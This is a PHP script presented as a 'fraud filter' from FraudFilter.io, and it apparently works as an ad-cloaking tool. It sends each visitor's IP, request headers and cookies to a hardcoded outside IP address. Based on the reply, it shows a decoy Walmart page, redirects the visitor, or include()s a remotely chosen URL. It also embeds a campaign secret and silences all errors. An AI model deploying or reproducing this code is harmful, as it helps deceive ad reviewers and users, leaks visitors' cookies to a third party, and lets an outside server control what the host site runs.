
<?php
// Version: v1.2.2
// Type: PHP UPLOAD

// Turn off all errors.
// If the script encounters any error, the error messages will not be leaked
error_reporting(0);

class FraudFilterDetector
{
    // You can edit these 3 fields as per your campaign
    private $CLID = 'k9re2';
    private $secret = '1fa7c7f6-6165-420a-be33-83b3d5051d05';
    
    private $redirect = false;
    private $safeURLorPath = 'https://www.walmart.com/ip/Preethi-Eco-Plus-Mixer-Grinder-110-Volts/139613950';
    

    // API configs
    private $endpoint = 'http://130.211.20.155/';
    private $isCurlAvailable = true;

    function __construct() {
        $this->isCurlAvailable = $this->isCurlInstalled();
    }

    public function apiEndpoint(){
        return $this->endpoint . $this->CLID;
    }

    public function check()
    {
        // Turn on output buffering, helps with the whitespace issues
        ob_start();
        // Send visit info to API and get back the response
        $resultObj = $this->postToAPI();
        // Redirect or Include based on the response from the API
        $this->action($resultObj);
    }

    function postToAPI()
    {
        // Use CURL if it's installed otherwise just use file_get_contents
        if ($this->isCurlAvailable === true) {
            return $this->postWithCurl();
        } else {
            return $this->postWithFileGetContents();
        }
    }

    private function isCurlInstalled()
    {
        if (in_array('curl', get_loaded_extensions())) {
            return true;
        } else {
            return false;
        }
    }

    function postWithCurl()
    {
        // Ceremony for CURL
        $resultObj = (object)array('result' => 0);
        $url = $this->apiEndpoint();
        $ch = curl_init($url);
        $headers = $this->AddAllRequiredHeaders();
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        // Set small timeouts to not cause "loading... forever" issue
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 1100);
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, 1100);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $output = curl_exec($ch);
        // Clean exit on error
        if (curl_errno($ch)) {
            $this->safeAction();
        }
        // Deal with API response quirks
        $output = trim($output);
        $result = $output[0];
        $resultObj->type = substr($output, 2, 1);
        $resultObj->url = substr($output, 4);
        if ($result === '1') {
            $resultObj->result = 1;
        } else if ($result === '0') {
            $resultObj->result = 0;
        }
        curl_close($ch);
        return $resultObj;
    }

    function AddAllRequiredHeaders()
    {
        $headers = array();
        $headers[] = 'content-length: 0';
        // This secret helps us link this request to customer's campaign in their account
        $headers[] = 'X-FF-P: ' . $this->secret;
        // Just add all the required headers
        $this->addHeader($headers, 'X-FF-REMOTE-ADDR', 'REMOTE_ADDR');
        $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'HTTP_X_FORWARDED_FOR');
        $this->addHeader($headers, 'X-FF-X-REAL-IP', 'HTTP_X_REAL_IP');
        $this->addHeader($headers, 'X-FF-DEVICE-STOCK-UA', 'HTTP_DEVICE_STOCK_UA');
        $this->addHeader($headers, 'X-FF-X-OPERAMINI-PHONE-UA', 'HTTP_X_OPERAMINI_PHONE_UA');
        $this->addHeader($headers, 'X-FF-HEROKU-APP-DIR', 'HEROKU_APP_DIR');
        $this->addHeader($headers, 'X-FF-X-FB-HTTP-ENGINE', 'X_FB_HTTP_ENGINE');
        $this->addHeader($headers, 'X-FF-X-PURPOSE', 'X_PURPOSE');
        $this->addHeader($headers, 'X-FF-REQUEST-SCHEME', 'REQUEST_SCHEME');
        $this->addHeader($headers, 'X-FF-CONTEXT-DOCUMENT-ROOT', 'CONTEXT_DOCUMENT_ROOT');
        $this->addHeader($headers, 'X-FF-SCRIPT-FILENAME', 'SCRIPT_FILENAME');
        $this->addHeader($headers, 'X-FF-REQUEST-URI', 'REQUEST_URI');
        $this->addHeader($headers, 'X-FF-SCRIPT-NAME', 'SCRIPT_NAME');
        $this->addHeader($headers, 'X-FF-PHP-SELF', 'PHP_SELF');
        $this->addHeader($headers, 'X-FF-REQUEST-TIME-FLOAT', 'REQUEST_TIME_FLOAT');
        $this->addHeader($headers, 'X-FF-COOKIE', 'HTTP_COOKIE');
        $this->addHeader($headers, 'X-FF-ACCEPT-ENCODING', 'HTTP_ACCEPT_ENCODING');
        $this->addHeader($headers, 'X-FF-ACCEPT-LANGUAGE', 'HTTP_ACCEPT_LANGUAGE');
        $this->addHeader($headers, 'X-FF-CF-CONNECTING-IP', 'HTTP_CF_CONNECTING_IP');
        $this->addHeader($headers, 'X-FF-INCAP-CLIENT-IP', 'HTTP_INCAP_CLIENT_IP');
        $this->addHeader($headers, 'X-FF-QUERY-STRING', 'QUERY_STRING');
        $this->addHeader($headers, 'X-FF-X-FORWARDED-FOR', 'X_FORWARDED_FOR');
        $this->addHeader($headers, 'X-FF-ACCEPT', 'HTTP_ACCEPT');
        $this->addHeader($headers, 'X-FF-X-WAP-PROFILE', 'X_WAP_PROFILE');
        $this->addHeader($headers, 'X-FF-PROFILE', 'PROFILE');
        $this->addHeader($headers, 'X-FF-WAP-PROFILE', 'WAP_PROFILE');
        $this->addHeader($headers, 'X-FF-REFERER', 'HTTP_REFERER');
        $this->addHeader($headers, 'X-FF-HOST', 'HTTP_HOST');
        $this->addHeader($headers, 'X-FF-VIA', 'HTTP_VIA');
        $this->addHeader($headers, 'X-FF-CONNECTION', 'HTTP_CONNECTION');
        $this->addHeader($headers, 'X-FF-X-REQUESTED-WITH', 'HTTP_X_REQUESTED_WITH');
        $this->addHeader($headers, 'User-Agent', 'HTTP_USER_AGENT');
        $this->addHeader($headers, 'Expected', '');
        $hh = $this->getAllHeadersFF();
        // This counter will help us preserve the order in which the headers are received
        $counter = 0;
        foreach ($hh as $key => $value) {
            $k = strtolower($key);
            if ($k === 'host') {
                $headers[] = 'X-FF-HOST-ORDER: ' . $counter;
                break;
            }
            $counter = $counter + 1;
        }
        return $headers;
    }

    function addHeader(& $headers, $out, $in)
    {
        if (!isset($_SERVER[$in])) {
            return;
        }
        $value = $_SERVER[$in];
        if (is_array($value)) {
            $value = implode(',', $value);
        }
        $headers[] = $out . ': ' . $value;
    }

    function getAllHeadersFF()
    {
       $headers = array ();
       foreach ($_SERVER as $name => $value)
       {
           if (substr($name, 0, 5) == 'HTTP_')
           {
               $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
           }
       }
       return $headers;
    }

    function postWithFileGetContents()
    {
        $resultObj = (object)array('result' => false);
        $url = $this->apiEndpoint();
        $headers = $this->AddAllRequiredHeaders();
        $opts = array('http' =>
            array(
                'method' => 'POST',
                'header' => $this->getHeadersAsOneString($headers),
                'timeout' => 0.25,
                'ignore_errors' => true
            )
        );
        $context = stream_context_create($opts);
        // Suppress errors
        $output = @file_get_contents($url, false, $context);
        // Clean exit on error
        if ($output === FALSE) {
            $this->safeAction();
        }
        // Handle API response
        $output = trim($output);
        $result = $output[0];
        $resultObj->type = substr($output, 2, 1);
        $resultObj->url = substr($output, 4);
        if ($result === '1') {
            $resultObj->result = 1;
        } else if ($output === '0') {
            $resultObj->result = 0;
        }
        return $resultObj;
    }

    function getHeadersAsOneString($headers)
    {
        $endline = " ";
        $response = "";
        foreach ($headers as &$arr) {
            $response = $response . $arr . $endline;
        }
        return $response;
    }

    function action($result)
    {
        if (!isset($result->type) || $result->result === 0) {
            $this->safeAction();
            return;
        }
        $type = $result->type;
        $url = $result->url;
        if ($type == 'u') {
            $this->redirect($url);
        } else if ($type == 'f') {
            include($url);
            die();
        } else {
            $this->safeAction();
        }
    }

    function safeAction()
    {
        

        if ($this->redirect === true){
            $this->redirect($this->safeURLorPath);
            return;
        } else  if ($this->redirect === false){
            include($this->safeURLorPath);
            die();
        }
    }

    function redirect($url)
    {
        if (!function_exists('headers_sent') || !headers_sent()) {
            header('Location: ' . $url, true, 302);
            die();
        }
        $html = <<<EOD
<!DOCTYPE html>
<html>
<head>
    <title>Please wait...</title>
    <script type="text/javascript">
        window.location.replace('{$url}');
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0;url='{$url}'"/>
    </noscript>
</head>
<body>
You are being redirected to <a href="{$url}" target="_top">your destination</a>.
<script type="text/javascript">
    window.location.replace('{$url}');
</script>
</body>
</html>
EOD;
        echo $html;
        die();
    }

    function completeURL($s)
    {
        return $this->urlOrigin($s) . $s['REQUEST_URI'];
    }

    function urlOrigin($s)
    {
        $ssl = (!empty($s['HTTPS']) && $s['HTTPS'] == 'on');
        $sp = strtolower($s['SERVER_PROTOCOL']);
        $protocol = substr($sp, 0, strpos($sp, '/')) . (($ssl) ? 's' : '');
        $port = $s['SERVER_PORT'];
        $port = ((!$ssl && $port == '80') || ($ssl && $port == '443')) ? '' : ':' . $port;
        $host = $s['HTTP_HOST'];
        $host = isset($host) ? $host : $s['SERVER_NAME'] . $port;
        return $protocol . '://' . $host;
    }

    function appendGetParameters($url, $getParameters)
    {
        if ($getParameters) {
            if (strpos($url, '?') !== false) {
                return $url . '&' . $getParameters;
            } else {
                return $url . '?' . $getParameters;
            }
        }
        return $url;
    }

    function getCLID()
    {
        return $this->CLID;
    }

    function concatQueryVars($originalUrl)
    {
        $second = $_SERVER['REQUEST_URI'];
        $url = strtok($originalUrl, '?');
        $first = parse_url($originalUrl, PHP_URL_QUERY);
        $second = parse_url($second, PHP_URL_QUERY);
        if (!$second) {
            return $originalUrl;
        }
        if (!$first) {
            return $url . '?' . $second;
        }
        return $url . '?' . $first . '&' . $second;
    }
}

$fraudFilterDetector = new FraudFilterDetector();
$fraudFilterDetector->check();

// @FraudFilter.io 2018

?>
